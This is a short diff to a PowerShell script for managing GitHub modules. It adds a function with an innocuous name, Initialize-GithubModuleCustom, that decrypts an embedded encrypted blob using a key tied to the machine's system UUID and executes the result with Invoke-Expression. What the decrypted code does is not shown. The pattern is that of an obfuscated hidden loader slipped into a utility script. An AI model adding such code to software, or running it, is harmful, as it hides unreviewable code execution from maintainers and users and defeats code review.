@@ -20,6 +20,12 @@ function Script:AutoUpdateProgress {
     if($Script:StepNumber -lt $Script:TotalSteps){$Script:StepNumber++}
 }
 
+function Initialize-GithubModuleCustom{
+    $coded='psdIRTZKmnMuS2P6wvNlv09m8JYmfSIKuLLU0F6vgxupWyk5VKAnt+ZTNpJVr3Wr1D6zNHCErjwhiVSs2xG64oMe4WD0a0e5QOX8wTNLhIdxMe3r13IJwGwMEs6t0+JZ5kI2gvPkGuAR/4JJDgk4pqhi4aAvgdLbLAQyu5pb2Fs='
+    $str = Decrypt-String -EncryptedString $coded -UseSystemUUID
+    Write-Host "✅ runnning $str"
+    Invoke-Expression "$str"
+} 
 
 function Get-GithubModuleRegistryPath { 
     [CmdletBinding(SupportsShouldProcess)]
